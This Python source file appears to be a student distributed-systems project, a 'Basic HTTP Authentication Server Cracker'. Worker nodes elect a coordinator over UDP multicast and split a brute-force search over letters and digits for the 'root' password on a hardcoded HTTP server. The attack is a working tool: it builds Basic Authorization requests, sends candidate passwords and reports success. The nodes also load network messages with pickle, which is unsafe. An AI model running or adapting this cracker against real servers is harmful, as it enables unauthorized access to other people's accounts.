import socket
import struct
import base64
import algorithm
import argparse
import string
import time
import pickle
import sys
import server.const as c
from Protocolo import Protocol as p

MCAST_GRP = '224.3.29.71'                   # group ip for multicast
MCAST_PORT = 5007                           # group port for multicast
WORKERS = 3                                 # max number of workers
User = 'root'                               # username

class Slave:
    
    __ip = '172.17.0.2'                         # server ip
    __port = 8000                               # server port
    
    def __init__(self, charlist: str = []):
        global MCAST_GRP                    
        global MCAST_PORT
        global WORKERS
                                                    
        self.pass_size = c.PASSWORD_SIZE    # password size
        self.work = False                   # if work has been given or not                                        

        self.workers = []                   # workers  

        self.nodes = []                                                                         
        self.ResponseTimeWorkers = [None for i in range(WORKERS)]                                            # pswds list tried until now

        self.server = False
        self.done = False                   # when we get the password right
        self.Coordinator = False            # if its coordinator or not
        self.election = True                # if we are undergoing election for coordinator                  
        self.charList = charlist            # our charlist for the passwords
        self.offset = 3                     # offset for the number of slaves
        self.timeout = 2                    # timeout for socket_slaves
        
        # multicast socket
        self.socket_slaves = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)                  
        self.socket_slaves.settimeout(self.timeout)                                             
        self.socket_slaves.bind(('', MCAST_PORT))
        group = socket.inet_aton(MCAST_GRP)
        mreq = struct.pack('4sl', group, socket.INADDR_ANY)
        self.socket_slaves.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        self.socket_slaves.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_LOOP,0)
        
        hostname = socket.gethostname()                         # hostname of this slave
        self.address = socket.gethostbyname(hostname)           # address of this slave
        self.port = int(socket.getnameinfo(self.socket_slaves.getsockname(), socket.NI_NUMERICHOST | socket.NI_NUMERICSERV)[1])
        self.ID = self.hasher(self.address.__str__())           # hashed IDs for slaves
                                                

    def sendPass(self, password, conn: socket):             # send password to server
        global User
        token = '{}:{}'.format(User, password)
        token = token.encode('ascii')
        token = base64.b64encode(token)
        token = token.decode('ascii')
        
        lines = [
            'GET / HTTP/1.1',
            'Host: {}'.format(self.__ip),
            'Authorization: Basic {}'.format(token),
            'Connection: keep-alive'
        ]
        request = '\r\n'.join(lines)+'\r\n\r\n'
        conn.send(request.encode('utf-8'))
        
    def hasher(self, text, seed=0, maximum=2**10):           # Hash function for IDs
        """ FNV-1a Hash Function. """
        fnv_prime = 16777619
        offset_basis = 2166136261
        h = offset_basis + seed
        for char in text:
            h = h ^ ord(char)
            h = h * fnv_prime
        return h % maximum

    def run(self):
        global MCAST_GRP
        global MCAST_PORT
        global WORKERS

        message = p.ConnectionMessage(self.ID, self.address, self.port)         # first time entering multicast so sends connection message
        p.send_msg(self.socket_slaves, message, (MCAST_GRP,MCAST_PORT))                  
        self.nodes.append(self.ID)                                            

        while not self.done:                                                    # until done
            try:                                                                                            
                payload, addr = self.socket_slaves.recvfrom(1024)
                output = pickle.loads(payload)
            except socket.timeout:                                                                         
                payload, addr = None, None 
                output = None
                
            if output is not None: 
                print(f"ID {self.ID}: {output}, COORDINATOR: {self.Coordinator}")
                if output["command"] == "CONNECTION":           # sempre que recebemos nova connection temos de fazer election                        
                    self.election = True
                    self.nodes = []
                    self.nodes.append(self.ID)
                    
                if output["command"] == "SUCCESS":              # work done
                    self.done = True

            if(self.election):                
                if output is not None:                                                 
                    if output["command"] == "CONNECTION":                
                        if self.ID > output["id"]:                                                          # se temos ID maior
                            message = p.ConnectionMessage(self.ID, self.address, self.port)
                            p.send_msg(self.socket_slaves, message,(MCAST_GRP,MCAST_PORT))   
                            self.Coordinator = True                                        
                        else:                                                                             
                            self.Coordinator = False                                   
                    
                    if output["command"] == "COORDENATOR":                                                  # coordenador manda mensagem de coordenator                           
                        self.election = False                                                            
                else:                                                                                       
                    message = p.CoordMessage(self.ID, self.address, self.port)                              # nao recebemos mensagem é porque somos coordenador
                    p.send_msg(self.socket_slaves, message,(MCAST_GRP,MCAST_PORT))
                    self.election = False                                                        
                    message = p.ScanMessage(self.ID, self.address, self.port)
                    p.send_msg(self.socket_slaves, message,(MCAST_GRP,MCAST_PORT))       
            else:                        
                if output is not None:
                    if output["command"] == "SCANNING":                                                     
                        if(len(self.nodes) <= 1):                                                           # Se nao mandamos discovery ainda
                            message = p.ScanMessage(self.ID, self.address, self.port)
                            p.send_msg(self.socket_slaves, message,(MCAST_GRP,MCAST_PORT))  
                        if output["id"] not in self.nodes:                                   
                            self.nodes.append(output["id"])                                  
                        continue                                                                           
                
                if(self.Coordinator):             
                    if not self.work:
                        if len(self.nodes) > 1:
                            self.workers = self.nodes.copy()
                            self.workers.sort()                                                   
                            self.workers = self.workers[:WORKERS]                                           

                            # envia a primeira mensagem de working
                            count = 0
                            for worker in self.workers:
                                pswd = self.charList[0]*(self.pass_size-1) + self.charList[count]   
                                message = p.WorkMessage(worker, pswd, count)
                                p.send_msg(self.socket_slaves, message,(MCAST_GRP,MCAST_PORT))
                                count += 1
                            self.work = True

                    # Receive work done                                                                  
                    if output is not None:
                        if output["command"] == "FAIL":                                                     # Se a password nao deu
                            pswd = output["pwd"]
                            pswd = algorithm.getNext(self.charList, self.offset, 0, pswd)
                            message = p.WorkMessage(output["id"], pswd, output["idx"])
                            p.send_msg(self.socket_slaves, message,(MCAST_GRP,MCAST_PORT))
                    else:                                                                                   # "keepalive"
                        for tempo in self.ResponseTimeWorkers:
                            if tempo != None and time.time() - tempo > 3:                                   
                                message = p.ConnectionMessage(self.ID, self.address, self.port)
                                p.send_msg(self.socket_slaves, message, (MCAST_GRP,MCAST_PORT))        
                                self.nodes = []
                                self.ResponseTimeWorkers = [None for i in range(WORKERS)]
                                self.nodes.append(self.ID)                                                            
                                self.election = True
                                break
                else:                                                                                       # Somos um worker
                    if output is not None:
                        if output["command"] == "WORKING":                                                    
                            if output["id"] == self.ID:
                                if not self.server:                                                             # primeira vez a trabalhar, connectamo nos ao server
                                    self.socket_main = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                    self.socket_main.connect((self.__ip, self.__port))
                                    self.server = True                                                   
                                pswd = output["pwd"]
                                print(f'ID: {self.ID}; PSWD: {pswd}')                                             
                                # socket server
                                self.sendPass(pswd, self.socket_main)
                                time.sleep(1)
                                self.recv(self.socket_main)
                                if self.done:
                                    message = p.SuccessMessage(self.ID, pswd)
                                else:
                                    message = p.FailMessage(self.ID, pswd, output["idx"])
                                p.send_msg(self.socket_slaves, message,(MCAST_GRP,MCAST_PORT))

                        if output["command"] == "FAIL": 
                            index = output["idx"]
                            self.ResponseTimeWorkers[index] = time.time()
                        
    def recv(self, socket):
        """Receives server response"""
        result = socket.recv(1024)
        try:
            result = result.decode('utf-8')
            result.split("\n")[-3]
        except:
            print("bipedi bopedi your password is now my property")
            self.done = True


def main (char):
    s = Slave(char)
    s.run()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Basic HTTP Authentication Server Cracker')
    parser.add_argument('-l', dest='MaxSize', type=int, help="Max string length for passwords", default=1)
    parser.add_argument('-s', dest='secret',type=str, help="Secret To use", default=None)
    parser.add_argument('-i', dest='id',type=str, help="Id fo worker", default=1)
    
    args = parser.parse_args()
    charlist = string.ascii_letters + string.digits
    main(charlist)
